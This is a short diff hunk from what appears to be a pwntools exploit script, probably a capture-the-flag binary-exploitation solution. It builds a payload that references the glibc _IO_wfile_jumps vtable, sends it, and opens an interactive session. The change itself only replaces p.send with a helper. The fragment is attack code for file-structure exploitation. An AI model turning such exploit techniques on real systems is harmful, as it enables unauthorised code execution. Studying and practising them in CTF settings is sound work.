@@ -101,5 +101,5 @@ pay += p64(io_wfile_jumps)
 assert len(pay) == 0xe0
 slog("pay_len", len(pay))
 
-p.send(pay)
+s(pay)
 p.interactive()
